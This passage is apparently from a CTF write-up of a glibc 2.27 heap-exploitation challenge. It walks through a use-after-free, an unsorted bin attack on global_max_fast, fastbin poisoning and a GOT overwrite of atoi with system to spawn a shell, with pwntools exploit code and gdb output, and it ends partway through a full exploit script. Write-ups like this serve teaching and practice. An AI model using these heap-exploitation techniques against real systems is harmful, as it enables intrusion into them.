</div><p>With UAF, overwrite the stored pointer in the unsorted bin chunk to <code>global_max_fast-0x10</code>. As you can see in the below gdb result, the stored pointer is now changed.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">BEFORE
</span></span><span class="line"><span class="cl">gefâž¤  x/4gx 0x405bf0-0x10
</span></span><span class="line"><span class="cl">0x405be0:	0x0000000000000000	0x0000000000002711
</span></span><span class="line"><span class="cl">0x405bf0:	0x00007ffff7dcdca0	0x00007ffff7dcdca0
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">AFTER
</span></span><span class="line"><span class="cl">gefâž¤  x/4gx 0x405bf0-0x10
</span></span><span class="line"><span class="cl">0x405be0:	0x0000000000000000	0x0000000000002711
</span></span><span class="line"><span class="cl">0x405bf0:	0x0000000000000000	0x00007ffff7dcf930
</span></span><span class="line"><span class="cl">gefâž¤  x/4gx 0x00007ffff7dcf930
</span></span><span class="line"><span class="cl">0x7ffff7dcf930 &lt;dumped_main_arena_end&gt;:	0x0000000000000000	0x0000000000000000
</span></span><span class="line"><span class="cl">0x7ffff7dcf940 &lt;global_max_fast&gt;:	0x0000000000000080	0x0000000000000000
</span></span></code></pre></td></tr></table>
</div>
</div><p>Notes that:</p>
<ul>
<li>This requires bruteforce, where this overwriting process will work only if the last two bytes of the libc base are all 0 (0x0000).</li>
<li>For the sake of simplicity, during writing this writeup, I simply change the previously defined <code>global_max_fast</code> offset to the correct offset in my local, which is <code>0xf940</code>.</li>
</ul>
<p>Now, let&rsquo;s allocate the same chunk, and you will notice that the <code>global_max_fast</code> value will be overwritten with a huge value (which is an address of libc).</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">BEFORE
</span></span><span class="line"><span class="cl">0x7ffff7dcf940 &lt;global_max_fast&gt;:	0x0000000000000080
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">AFTER
</span></span><span class="line"><span class="cl">0x7ffff7dcf940 &lt;global_max_fast&gt;:	0x00007ffff7dcdca0
</span></span></code></pre></td></tr></table>
</div>
</div><p>Now, after this, when we freed any chunk, it will go to <code>fastbin</code> due to the huge value stored in the <code>global_max_fast</code>. Let&rsquo;s free 2 chunks that we have created before.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl"># Now, when we free our previous three chunks, it will go to fastbin
</span></span><span class="line"><span class="cl">free(r,1)
</span></span><span class="line"><span class="cl">free(r,0)
</span></span><span class="line"><span class="cl">log.info(&#34;Now, we have fastbin chunk with size 0x110&#34;)
</span></span><span class="line"><span class="cl">pause()
</span></span></code></pre></td></tr></table>
</div>
</div><p>Check on gdb, after the above execution, we successfully cache the robots[0] and robots[1] chunks to fastbin[0x110].</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Below is our fastbin[0x110] linked list
</span></span><span class="line"><span class="cl">gefâž¤  x/4gx 0x00000000004059d0-0x10
</span></span><span class="line"><span class="cl">0x4059c0:	0x0000000000000000	0x0000000000000111
</span></span><span class="line"><span class="cl">0x4059d0:	0x0000000000405ad0	0x0000000000000000
</span></span><span class="line"><span class="cl">gefâž¤  x/4gx 0x0000000000405ae0-0x10
</span></span><span class="line"><span class="cl">0x405ad0:	0x0000000000000000	0x0000000000000111
</span></span><span class="line"><span class="cl">0x405ae0:	0x00007ffff7dcdcb0	0x0000000000000000
</span></span></code></pre></td></tr></table>
</div>
</div><p>Now, with UAF, we want to overwrite the <code>atoi</code> GOT entry to <code>system</code>. First, let&rsquo;s corrupt our fastbin chunk, to point to the robot_memory_size_offset[3], which mean the fake chunk metadata size is robot_memory_size_offset[4].</p>
<p>Fastbin is pretty strict, where we need to forge the next pointer to point to the same size fastbin chunk. This is the reason why we set robots[4] size to <code>0x111</code>, so that our fake chunk (which points to robot_memory_size_offset[3]) will have size metadata <code>0x111</code> (just like the value stored in robot_memory_size_offset[4]). Because of this, our exploit to change the fastbin linked list will be working well.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="c1"># We are going to overwrite atoi got with system</span>
</span></span><span class="line"><span class="cl"><span class="n">atoi_got</span> <span class="o">=</span> <span class="n">exe</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s1">&#39;atoi&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;atoi address: </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">atoi_got</span><span class="p">)</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Points to the size of robots[3]</span>
</span></span><span class="line"><span class="cl"><span class="c1"># Remember that fastbin is pretty strict with its chunk size, which is why we previously set</span>
</span></span><span class="line"><span class="cl"><span class="c1"># The robots[4] size to 0x111, so that it can be used as a fake fastbin chunk with size 0x110</span>
</span></span><span class="line"><span class="cl"><span class="n">robot_memory_size_offset</span> <span class="o">=</span> <span class="mh">0x4040c8</span>
</span></span><span class="line"><span class="cl"><span class="n">edit</span><span class="p">(</span><span class="n">r</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="n">p64</span><span class="p">(</span><span class="n">robot_memory_size_offset</span><span class="p">))</span> <span class="c1"># UAF,overwrite fastbin pointer to the robot memory size offset</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">create</span><span class="p">(</span><span class="n">r</span><span class="p">,</span> <span class="n">tcache_size</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">create</span><span class="p">(</span><span class="n">r</span><span class="p">,</span> <span class="n">tcache_size</span><span class="p">)</span> <span class="c1"># Now robot[1] point to the desired offset. We now have arbitrary write</span>
</span></span><span class="line"><span class="cl"><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;Now, robots[1] point to the desired offset&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">pause</span><span class="p">()</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>After the above execution, inspecting in gdb, we successfully create our arbitrary write primitive in the robots[1].</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">gefâž¤  x/5gx &amp;robots
</span></span><span class="line"><span class="cl">0x404100 &lt;robots&gt;:	0x0000000000000000	0x00000000004040d8
</span></span><span class="line"><span class="cl">0x404110 &lt;robots+16&gt;:	0x0000000000000000	0x0000000000000000
</span></span><span class="line"><span class="cl">0x404120 &lt;robots+32&gt;:	0x0000000000000000
</span></span><span class="line"><span class="cl">gefâž¤  x/10gx 0x00000000004040d8-0x10
</span></span><span class="line"><span class="cl">0x4040c8 &lt;robot_memory_size+8&gt;:	0x0000011100002700	0x0000000000000111
</span></span><span class="line"><span class="cl">0x4040d8:	0x0000000000000000	0x0000000100000000
</span></span><span class="line"><span class="cl">0x4040e8 &lt;check_robot_slot+8&gt;:	0x0000000000000000	0x0000000000000000
</span></span><span class="line"><span class="cl">0x4040f8:	0x0000000000000000	0x0000000000000000
</span></span><span class="line"><span class="cl">0x404108 &lt;robots+8&gt;:	0x00000000004040d8	0x0000000000000000
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Notice that robots[1] now points to robot_memory_size[3]
</span></span></code></pre></td></tr></table>
</div>
</div><p>Now, with the feature <code>program_robot</code>, we can modify the <code>robots</code> array stored value, so that it points to our desired address. We can do this because the stored size of robots[1] in <code>robot_memory_size</code> array is large enough to reach the <code>robots</code>. Then with the <code>program_robot</code> to the element robots[0], we can write any value that we want.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span><span class="o">*</span><span class="mi">2</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span><span class="o">*</span><span class="mi">3</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">atoi_got</span><span class="p">)</span> <span class="c1"># Set robots[0] to atoi GOT</span>
</span></span><span class="line"><span class="cl"><span class="n">edit</span><span class="p">(</span><span class="n">r</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="n">payload</span><span class="p">)</span> <span class="c1"># Arbitrary write</span>
</span></span><span class="line"><span class="cl"><span class="n">edit</span><span class="p">(</span><span class="n">r</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="n">p64</span><span class="p">(</span><span class="n">system_offset</span><span class="p">)[:</span><span class="mi">2</span><span class="p">])</span> <span class="c1"># Partial overwrite atoi to system</span>
</span></span><span class="line"><span class="cl"><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;Now, atoi is changed to system&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">pause</span><span class="p">()</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Notes that as mentioned before, this required bruteforce. For the sake of simplicity in this writeup, I manually set the correct system offset in my local. Below is the gdb inspection result.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">BEFORE
</span></span><span class="line"><span class="cl">[0x404058] atoi@GLIBC_2.2.5  â†’  0x7ffff7a22670
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">AFTER
</span></span><span class="line"><span class="cl">[0x404058] atoi@GLIBC_2.2.5  â†’  0x7ffff7a31420
</span></span><span class="line"><span class="cl">gefâž¤  x/gx 0x7ffff7a31420
</span></span><span class="line"><span class="cl">0x7ffff7a31420 &lt;__libc_system&gt;:	0xfa66e90b74ff8548
</span></span></code></pre></td></tr></table>
</div>
</div><p>Now, let&rsquo;s take a step back to look at the <code>robots_factory</code> menu code.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="n">undefined8</span> <span class="nf">robots_factory</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="kt">int</span> <span class="n">iVar1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  
</span></span><span class="line"><span class="cl">  <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;Welcome to the secret robots factory!&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="k">while</span><span class="p">(</span> <span class="nb">true</span> <span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nf">menu</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="n">iVar1</span> <span class="o">=</span> <span class="nf">read_int</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">iVar1</span> <span class="o">==</span> <span class="mi">4</span><span class="p">)</span> <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">iVar1</span> <span class="o">&lt;</span> <span class="mi">5</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="k">if</span> <span class="p">(</span><span class="n">iVar1</span> <span class="o">==</span> <span class="mi">3</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nf">destroy_robot</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">      <span class="p">}</span>
</span></span><span class="line"><span class="cl">      <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="n">iVar1</span> <span class="o">&lt;</span> <span class="mi">4</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="n">iVar1</span> <span class="o">==</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">          <span class="nf">new_robot</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="n">iVar1</span> <span class="o">==</span> <span class="mi">2</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">          <span class="nf">program_robot</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">      <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>To process our input, it will call <code>read_int</code>.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">read_int</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="kt">int</span> <span class="n">iVar1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="kt">long</span> <span class="n">in_FS_OFFSET</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="kt">char</span> <span class="n">local_15</span> <span class="p">[</span><span class="mi">5</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">  <span class="kt">long</span> <span class="n">local_10</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  
</span></span><span class="line"><span class="cl">  <span class="n">local_10</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="kt">long</span> <span class="o">*</span><span class="p">)(</span><span class="n">in_FS_OFFSET</span> <span class="o">+</span> <span class="mh">0x28</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="n">local_15</span><span class="p">,</span><span class="mi">4</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="n">iVar1</span> <span class="o">=</span> <span class="nf">atoi</span><span class="p">(</span><span class="n">local_15</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="n">local_10</span> <span class="o">!=</span> <span class="o">*</span><span class="p">(</span><span class="kt">long</span> <span class="o">*</span><span class="p">)(</span><span class="n">in_FS_OFFSET</span> <span class="o">+</span> <span class="mh">0x28</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                    <span class="cm">/* WARNING: Subroutine does not return */</span>
</span></span><span class="line"><span class="cl">    <span class="nf">__stack_chk_fail</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="n">iVar1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>As you can see, we can send a string with size limited to 4, and it will be passed to <code>atoi</code>.</p>
<p>That means we just need to simply send <code>sh</code> during inputting the usual menu, and we gain a shell. In remote, We just need to run the below script many times, and if the ASLR of the libc base&rsquo;s last two bytes is 0x0000, we will successfully spawn the shell, like the picture below.</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://i.imgur.com/Q9GR5gc.png"
        data-srcset="https://i.imgur.com/Q9GR5gc.png, https://i.imgur.com/Q9GR5gc.png 1.5x, https://i.imgur.com/Q9GR5gc.png 2x"
        data-sizes="auto"
        alt="https://i.imgur.com/Q9GR5gc.png"
        title="https://i.imgur.com/Q9GR5gc.png" /></p>
<p>Full script:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">  1
</span><span class="lnt">  2
</span><span class="lnt">  3
</span><span class="lnt">  4
</span><span class="lnt">  5
</span><span class="lnt">  6
</span><span class="lnt">  7
</span><span class="lnt">  8
</span><span class="lnt">  9
</span><span class="lnt"> 10
</span><span class="lnt"> 11
</span><span class="lnt"> 12
</span><span class="lnt"> 13
</span><span class="lnt"> 14
</span><span class="lnt"> 15
</span><span class="lnt"> 16
</span><span class="lnt"> 17
</span><span class="lnt"> 18
</span><span class="lnt"> 19
</span><span class="lnt"> 20
</span><span class="lnt"> 21
</span><span class="lnt"> 22
</span><span class="lnt"> 23
</span><span class="lnt"> 24
</span><span class="lnt"> 25
</span><span class="lnt"> 26
</span><span class="lnt"> 27
</span><span class="lnt"> 28
</span><span class="lnt"> 29
</span><span class="lnt"> 30
</span><span class="lnt"> 31
</span><span class="lnt"> 32
</span><span class="lnt"> 33
</span><span class="lnt"> 34
</span><span class="lnt"> 35
</span><span class="lnt"> 36
</span><span class="lnt"> 37
</span><span class="lnt"> 38
</span><span class="lnt"> 39
</span><span class="lnt"> 40
</span><span class="lnt"> 41
</span><span class="lnt"> 42
</span><span class="lnt"> 43
</span><span class="lnt"> 44
</span><span class="lnt"> 45
</span><span class="lnt"> 46
</span><span class="lnt"> 47
</span><span class="lnt"> 48
</span><span class="lnt"> 49
</span><span class="lnt"> 50
</span><span class="lnt"> 51
</span><span class="lnt"> 52
</span><span class="lnt"> 53
</span><span class="lnt"> 54
</span><span class="lnt"> 55
</span><span class="lnt"> 56
</span><span class="lnt"> 57
</span><span class="lnt"> 58
</span><span class="lnt"> 59
</span><span class="lnt"> 60
</span><span class="lnt"> 61
</span><span class="lnt"> 62
</span><span class="lnt"> 63
</span><span class="lnt"> 64
</span><span class="lnt"> 65
</span><span class="lnt"> 66
</span><span class="lnt"> 67
</span><span class="lnt"> 68
</span><span class="lnt"> 69
</span><span class="lnt"> 70
</span><span class="lnt"> 71
</span><span class="lnt"> 72
</span><span class="lnt"> 73
</span><span class="lnt"> 74
</span><span class="lnt"> 75
</span><span class="lnt"> 76
</span><span class="lnt"> 77
</span><span class="lnt"> 78
</span><span class="lnt"> 79
</span><span class="lnt"> 80
</span><span class="lnt"> 81
</span><span class="lnt"> 82
</span><span class="lnt"> 83
</span><span class="lnt"> 84
</span><span class="lnt"> 85
</span><span class="lnt"> 86
</span><span class="lnt"> 87
</span><span class="lnt"> 88
</span><span class="lnt"> 89
</span><span class="lnt"> 90
</span><span class="lnt"> 91
</span><span class="lnt"> 92
</span><span class="lnt"> 93
</span><span class="lnt"> 94
</span><span class="lnt"> 95
</span><span class="lnt"> 96
</span><span class="lnt"> 97
</span><span class="lnt"> 98
</span><span class="lnt"> 99
</span><span class="lnt">100
</span><span class="lnt">101
</span><span class="lnt">102
</span><span class="lnt">103
</span><span class="lnt">104
</span><span class="lnt">105
</span><span class="lnt">106
</span><span class="lnt">107
</span><span class="lnt">108
</span><span class="lnt">109
</span><span class="lnt">110
</span><span class="lnt">111
</span><span class="lnt">112
</span><span class="lnt">113
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="n">p64</span><span class="p">,</span> <span class="n">u64</span><span class="p">,</span> <span class="n">p32</span><span class="p">,</span> <span class="n">u32</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s1">&#39;amd64&#39;</span>
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">encoding</span> <span class="o">=</span> <span class="s1">&#39;latin&#39;</span>
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;INFO&#39;</span>
</span></span><span class="line"><span class="cl"><span class="n">warnings</span><span class="o">.</span><span class="n">simplefilter</span><span class="p">(</span><span class="s2">&#34;ignore&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">exe</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&#34;./main_patched&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&#34;./libc-2.27.so&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">ld</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&#34;./ld-2.27.so&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">exe</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">conn</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">args</span><span class="o">.</span><span class="n">LOCAL</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">r</span> <span class="o">=</span> <span class="n">process</span><span class="p">([</span><span class="n">exe</span><span class="o">.</span><span class="n">path</span><span class="p">])</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">args</span><span class="o">.</span><span class="n">PLT_DEBUG</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">gdb</span><span class="o">.</span><span class="n">attach</span><span class="p">(</span><span class="n">r</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">url</span> <span class="o">=</span> <span class="s1">&#39;blackhat2-ea1a9ec94289cd9df8e692f6ce7c828e-0.chals.bh.ctf.sa&#39;</span>
</span></span><span class="line"><span class="cl">        <span class="n">r</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="mi">443</span><span class="p">,</span> <span class="n">ssl</span><span class="o">=</span><span class="kc">True</span><span class="p">,</span> <span class="n">sni</span><span class="o">=</span><span class="n">url</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">r</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">create</span><span class="p">(</span><span class="n">r</span><span class="p">,</span> <span class="n">size</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;&gt; &#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;1&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;size:</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">size</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">edit</span><span class="p">(</span><span class="n">r</span><span class="p">,</span> <span class="n">idx</span><span class="p">,</span> <span class="n">payload</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;&gt; &#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;2&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;slot:&#39;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;robot:&#39;</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">free</span><span class="p">(</span><span class="n">r</span><span class="p">,</span> <span class="n">idx</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;&gt; &#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;3&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;slot:&#39;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
</span></span><span class="line"><span class="cl">
